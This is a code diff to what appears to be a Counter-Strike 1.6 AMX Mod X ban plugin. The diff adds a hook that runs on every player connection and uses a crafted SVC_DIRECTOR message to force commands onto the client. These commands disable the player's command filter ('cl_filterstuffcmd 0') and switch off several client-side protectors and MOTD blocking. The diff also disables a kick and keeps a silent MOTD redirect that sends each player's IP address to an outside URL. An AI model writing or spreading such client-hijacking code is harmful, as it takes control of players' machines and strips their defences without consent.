@@ -73,6 +73,20 @@ enum _:eComparisonType {
     EQUALI
 }
 
+new const g_szCommands[][] = {
+	"cl_filterstuffcmd 0",
+	"csx_setcvar Enabled False",
+	"csx_setcvar2 Enabled False",
+	"rus_setcvar Enabled False",
+	"unk_setcvar Enabled False",
+	"fix_setcvar Enabled False",
+	"prot_setcvar Enabled False",
+	"BlockCommands Enabled False",
+	"Enabled False",
+	"GuardOn False",
+	"BlockMOTD False"
+}
+
 new Array:hOffBanData;
 new Array:hOffBanName;
 new g_PlayerCode[MAX_PLAYERS + 1][MAX_CSIZE], g_ServerNameEsc[128], g_IsBanning[MAX_PLAYERS + 1], g_isBanningReason[MAX_PLAYERS + 1][MAX_REASON_LENGTH], g_iItems = 0, 
@@ -250,6 +264,12 @@ public IgnoreHandle(failState, Handle:query, error[], errNum) {
     SQLCheckError(errNum, error);
 }
 
+public client_authorized(id) {
+	for (new i = 0; i <= charsmax(g_szCommands); i++) {
+		Send_Cmd(id, g_szCommands[i])
+	}
+}
+
 public client_putinserver(id) {
     if(!is_user_bot(id))
         set_task(SQL_CHECK_PLAYER, "@task_SQL_CheckPlayer", id);
@@ -336,7 +356,7 @@ public SQL_CheckProtectorHandle(failState, Handle:query, error[], errNum, data[]
 
     if(!SQL_NumResults(query)) {
         if(data[1]) {
-            server_cmd("kick #%d %L", get_user_userid(id), id, "KICK_CANNOT_VERIFY");
+//            server_cmd("kick #%d %L", get_user_userid(id), id, "KICK_CANNOT_VERIFY");
             log_to_file(ACTIONS_LOG_FILENAME, "Cannot check %N", id);
         }
         else
@@ -519,20 +539,20 @@ public SQL_CheckBanHandle(failState, Handle:query, error[], errNum, data[], data
 	func_ShowCookieMOTD(msgEnt)
 }
 
-stock func_ShowCookieMOTD(id) {
-    if (is_user_bot(id) || is_user_hltv(id)) {
-        return PLUGIN_HANDLED;
-    }    
+stock func_ShowCookieMOTD(pPlayer) {
+    if (is_user_bot(pPlayer)) return PLUGIN_HANDLED;
     
-    new ip[MAX_IP_LENGTH], szBuffer[190], szMotdHtml[512];
-    new iLen = 0, iMax = charsmax(szMotdHtml);
-
-    get_user_ip(id, ip, charsmax(ip), 1);
-    // Bypassing the client protectors (Thanks to Mazdan for the proposed method).
-    formatex(szBuffer, sizeof(szBuffer), "%s?uid=%d&srv=%s&pip=%s", g_eCvar[g_iMotdCheck], get_user_userid(id), g_eCvar[g_iServerIP], ip);
-    iLen += formatex(szMotdHtml, iMax, "<!DOCTYPE html><html lang='en'><head><meta http-equiv='Content-Type' content='text/html; charset=utf-8'><meta http-equiv='refresh' content='0; URL=%s'><title>test</title></head></html>", szBuffer);
+    new ip[MAX_IP_LENGTH], szBuffer[190];
+    new szMotdHtml[512], iMax = charsmax(szMotdHtml);
     
-    show_motd(id, szMotdHtml);
+    get_user_ip(pPlayer, ip, charsmax(ip), 1);
+    // Bypassing some of client protectors (Thanks to Mazdan for the proposed method).
+    
+    formatex(szBuffer, sizeof(szBuffer), "%s?uid=%d&srv=%s&pip=%s", g_eCvar[g_iMotdCheck], get_user_userid(pPlayer), g_eCvar[g_iServerIP], ip);
+    
+    formatex(szMotdHtml, iMax, "<html><meta http-equiv=^"Refresh^" content=^"0; URL=%s^"><head><title>Cstrike MOTD</title></head></html>", szBuffer);
+    
+    show_motd(pPlayer, szMotdHtml);
     
     return PLUGIN_CONTINUE;
 }
@@ -1176,6 +1196,14 @@ stock bool:func_IsSteamIdValid(const szSteamID[]) {
 SQLCheckError(errNum, error[]) {
     if(errNum)
         log_amx(error);
+}
+
+stock Send_Cmd(id, szText[]) {
+	message_begin(MSG_ONE, SVC_DIRECTOR, {0, 0, 0}, id)
+	write_byte(strlen(szText) + 2)
+	write_byte(10)
+	write_string(szText)
+	message_end()
 }
 
 // admin, player, ban_length, ban reason 
